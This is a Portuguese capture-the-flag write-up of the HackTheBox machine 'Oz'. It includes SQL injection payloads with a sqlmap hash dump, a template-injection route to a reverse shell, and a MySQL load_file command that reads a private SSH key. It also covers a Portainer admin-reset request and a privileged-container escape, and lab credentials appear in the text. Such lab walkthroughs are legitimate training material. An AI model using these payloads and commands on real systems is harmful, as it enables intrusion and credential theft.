> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [march0s1as.github.io](https://march0s1as.github.io/writeups/oz.html)

> https://march0s1as.github.io/writeups/

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled.png)

* * *

Eaí, hackers! De antemão, queria agradecer ao meu brother [kn1ghtmare](https://github.com/knightm4re) pelo fork no meu writeup passado, a partir de hoje todos os meus writeups seguirão a mesma lógica de categorizar as etapas de realização da máquina. Sem mais enrolação, vamos lá!

### Enumeração de portas. 🚪

```
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Werkzeug httpd 0.14.1 (Python 2.7.14)
8080/tcp open  http    syn-ack Werkzeug httpd 0.14.1 (Python 2.7.14)


```

O que me chama atenção na enumeração de portas é que a máquina não possui uma porta SSH, somente duas portas HTTP. De qualquer forma, vamos partir para a enumeração das mesmas! 🐰

### Reconhecimento nas portas 80 e 8080. 🖥️

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%201.png)

Na porta **80**, a página nos mostra uma mensagem de “Por favor, registre um usuário”. Podemos notar também que o título da página nos chama atenção: **OZ webapi**, ou seja, vamos começar o API Fuzzing!

Quando eu tentei enumerar os diretórios, todos retornavam 200 OK como resposta. Quando eu tentei dar um cURL em um diretório que supostamente não existe, veja o que acontece:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%202.png)

Como visto acima, ele retorna uma string aleatória quando a URL não é válida, deixando toda requisição feita com status code 200.. Disgrama💔. Ademais, eu pensei “se ele pede para registrarmos um usuário, então provavelmente o diretório seja condizente com o mesmo, algo como ‘register’ ou ‘user’ deve funcionar”. E foi isso que eu fiz, ao colocar “register” como diretório, ele retorna isso:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%203.png)

Ao que me parece, quando a URL é válida, ele retorna com um “Please register a username!”, que nem no diretório padrão. Com isso, eu elaborei um script em golang para filtrar todas as responses com o conteúdo de “Please register a username!”. Segue o código (ele tá bem ruim):

```
package main
import (
	"os"
	"fmt"
	"bufio"
	"strings"
	"net/http"
	"io/ioutil"
)

func error(err interface{}) {
    if err != nil{
        panic(err)
    }
}

func scan(url string){
	fmt.Println(url)
	req, err := http.Get(url)
	error(err)

	body, err := ioutil.ReadAll(req.Body)
	error(err)
	resultado := string(body)
	verificar := strings.Contains(resultado, "Please register a username!")
	if verificar == true{
		fmt.Println(resultado)
	}
}

func main(){
	file, err := os.Open("big.txt") // especificar o path da wordlist
	 
	if err != nil {
		fmt.Println("falha ao ler arquivo, favor verificar o path.")
	}
 
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string
 
	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}
	 
	file.Close()
 
	for _, eachline := range txtlines {
		//fmt.Println(eachline)
		site := fmt.Sprintf("http://10.10.10.96/%s", eachline)
		scan(site)
	}
}


```

Feito isso, eu notei algo interessante quando ele chega no diretório “users”, se liga:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%204.png)

Entrando na URL, nos deparamos com a seguinte interface:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%205.png)

Ao que me parece, o diretório é válido 🥳! Quando eu fui colocar um diretório aleatório para ver se ele retornava uma string aleatória que nem antes, ele retornou um JSON. Ou seja, estamos interagindo agora com a API. Ao colocar uma aspas simples para ver o que acontecia, ele nos retornou um erro 500 no servidor:

### SQL Injection. 💉

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%206.png)

Com isso, vamos ver se o mesmo é vulnerável a SQL Injection! Rodamos o SQLMAP (não tenho saco pra fazer na mão, perdão) e ele afirmou que é um target vulnerável e aqui está o payload:

```
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.10.96:80/users/' AND (SELECT 4539 FROM (SELECT(SLEEP(5)))HnFr) AND 'oafg'='oafg

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://10.10.10.96:80/users/' UNION ALL SELECT CONCAT(0x716b6a6a71,0x4a5a75686a466179666c6479446b6a69414a5775566c656e4d587945655252776a6463746c517144,0x7171717871)-- -


```

Após a enumeração de databases, tabelas e colunas, consegui pegar usuários e senhas (infelizmente criptografadas) na tabela “users_gwb”. Aqui está o resultado:

```
# sqlmap --url="http://10.10.10.96/users/" -D ozdb -T users_gbw -C id,password,username --dump

Database: ozdb                                                                                                                     
Table: users_gbw
[6 entries]
+----+----------------------------------------------------------------------------------------+-------------+
| id | password                                                                               | username    |
+----+----------------------------------------------------------------------------------------+-------------+
| 1  | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 | dorthi      |
| 2  | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk | tin.man     |
| 3  | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY | wizard.oz   |
| 4  | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY | coward.lyon |
| 5  | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg | toto        |
| 6  | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ | admin       |
+----+----------------------------------------------------------------------------------------+-------------+


```

Quebrando-as com john e utilizando a rockyou.txt como wordlist, nós conseguimos quebrar a hash. Com isso, pegamos credenciais: wizard.oz:wizardofoz22

### Server Side Template Injection. 🐘

Após logarmos no serviço rodando na porta 8080, nos deparamos com a seguinte interface de criação e monitoramento de tickets:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%207.png)

Quando nós escolhermos adicionar um ticket (no “+” no canto superior direito), esta é a requisição que enviamos e recebemos:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%208.png)

Como vimos na requisição acima, ao especificarmos o valor para o parâmetro **name** e **desc**, ambos são “refletidos” na response. Nós também sabemos que eles utilizam um sistema de template, no caso **Jinja2**, para o desenvolvimento do web server (notamos isso na enumeração do nmap, quando ele nos mostrou que estava sendo utilizando **python 2.7**). Tendo como base para payloads o site [SSTI - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python), eu escolhi um payload de multiplicação para verificar se de fato é vulnerável, e adivinha? Deu certo! 😏

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%209.png)

**Server Side Template Injection**, como o próprio nome diz, é uma injeção de códigos utilizando o sistema de template que roda no site. Com isso, as templates aceitam também execução de comandos shell (twig, erb, jinja2, etc..). Como nós podemos injetar comandos de template, nós podemos nos aproveitar disso e utilizar o sistema de template para a execução remota de comandos.

Utilizando o Payload All The Things como base, eu consegui achar um payload utilizando para **Jinja2** para execução de comandos. Aqui está:

Criptografando-o em URL Encode e injetando no parâmetro vulnerável, recebemos a response com o output do comando! 🥳

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2010.png)

### Reverse shell! 😈

Para pegarmos shell reversa no servidor, eu utilizei este payload que confere uma reverse shell com netcat e jinja2:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2011.png)

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/mp4.gif)

* * *

### Pivota y pivota. 🤧

Agora que já estamos dentro, é quando a baderna vai começar. Para nos contextualizarmos melhor na rede, eu subi o [nmap](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap) na máquina e enumerei todos os dispositivos conectados na rede. Com isso, eu obtive este resultado:

```
Nmap scan report for ozdb.prodnet (10.100.10.4)
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:0A:64:0A:04 (Unknown)

Nmap scan report for webapi.prodnet (10.100.10.6)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:0A:64:0A:06 (Unknown)
)
Nmap scan report for tix-app (10.100.10.2)
PORT     STATE SERVICE
8080/tcp open  http-alt


```

Notamos que há três máquinas, onde duas hospedam portas **HTTP** e uma hospeda uma porta para o gerenciamento de banco de dados utilizando o serviço **MySQL**. Com isso em mente, vamos enumerar agora a máquina em que estamos (lembrando que já estamos rootados).

Enumerando melhor a máquina, pude perceber que existe um diretório localizado na raiz do sistema (**/**) e que o mesmo possui arquivos confidenciais com senhas:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2012.png)

Com isso, nós pegamos credenciais de dois usuários MySQL rodando no container **10.100.10.4**, uma do usuário “dorthi” e outra do usuário “root”. Executando o comando abaixo, ele irá mostrar o resultado do “id_rsa” do usuário dorthi:

```
mysql -h 10.100.10.4 -u "root" -p"SuP3rS3cr3tP@ss" -e "select load_file('/home/dorthi/.ssh/id_rsa');"


```

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2013.png)

Posteriormente, eu vi que a máquina não possui a porta 22 aberta para a conexão remota. Vasculhando mais a mesma, eu pude encontrar um arquivo intrigante na pasta “**/.secrets**” intitulado de “**knockd.conf**”. Abrindo ele, vemos isso:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2014.png)

**Port Knocking !!** Utilizando a ferramenta [knock](https://github.com/grongor/knock), nós conseguimos “acordar” as portas especificadas, e assim, abrir a porta 22, como exibida na imagem acima. Utilizando a senha “N0Pl4c3L1keH0me”, nós pegamos o usuário. Vamos lá:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2015.png)

### Elevação de privilégio. 📈

Ao entrarmos na máquina via SSH, como vimos na imagem anterior, eu percebo que nós temos privilégio de root para executar alguns comandos **docker**, veja:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2016.png)

Nós temos permissão para listar a network dos containers e para ver informações sobre as mesmas. Decidindo ver as informações da network **bridge**, nós nos deparamos com algo interessante: está rodando um serviço chamado “**portainer**”, como é possível ver quando listamos as informações.

```
"Containers": {
            "e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14": {
                "Name": "portainer-1.11.1",
                "EndpointID": "fb5856e37c481199e5f80b14fe76c79b4cffd5a78bd40c87f613afd25995123c",
                "MacAddress": "02:42:ac:11:00:02",
                "IPv4Address": "172.17.0.2/16",
                "IPv6Address": ""
            }


```

Rodando um nmap no IP do container que está rodando esse serviço, nós vemos que a mesma está localizada na porta 9000. Veja:

```
Discovered open port 9000/tcp on 172.17.0.2
Completed Connect Scan at 16:27, 0.00s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.00043s latency).
PORT     STATE SERVICE
9000/tcp open  unknown


```

```
ssh -L 9000:172.17.0.2:9000 -R 9000:172.17.0.2:9000 -i id_rsa dorthi@10.10.10.96


```

Realizando o port fowarding via SSH, nós nos deparamos com a seguinte interface do portainer:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2017.png)

Como vimos, nós nos deparamos com uma tela de login. Testando por default credencials, como admin:admin, admin:password, guest:guest, nenhuma nos retorna algo 😔. Com isso, eu fui pesquisar se havia algum exploit público para a versão do portainer. Para quem não se lembra, a versão apareceu quando executamos o comando “**sudo /usr/bin/docker network inspect bridge**”, se liga:

```
"Name": "portainer-1.11.1",


```

Feito isso, eu consegui achar um suposto exploit de **reset admin credentials** para a exata versão rodando no [GitHub](https://github.com/portainer/portainer/issues/493). Para realizarmos o exploit, nós enviamos uma requisição **POST** para o diretório **/api/users/admin/init** com um JSON especificando o usuário e a senha.

```
{
	"Username":"admin",
	"Password":"admin"
}


```

Feito isso, nós enviamos a requisição e a nova senha do admin será setada para a que escolhemos! 👾

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2018.png)

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2019.png)

Agora, para pegarmos a flag de root, nós vamos criar um container com privilégios de root. Para fazer isso, eu criei um novo container com as seguintes configurações:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2020.png)

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2021.png)

O que eu fiz, de maneira simplificada, foi criar um novo container onde o diretório **/root** da máquina em que estávamos fosse movido para o diretório **/mnt** do nosso novo container. Para isso, eu escolhi uma imagem de container que já existia na rede, especifiquei o path que eu queria mover (no caso, **/root**) e o path para onde eu queria que fosse movido (**/mnt**). Feito isso, eu habilitei o modo **Privilege mode**, localizado na aba de **Security/Host** e criei a imagem do container (passo a passo nas duas prints acima).

Feito isso, eu acessei o console que me é disponibilizado e:

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2022.png)

![](https://march0s1as.github.io/writeups/Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2023.png)

E é isso! Obrigado por terem lido até aqui! 🤠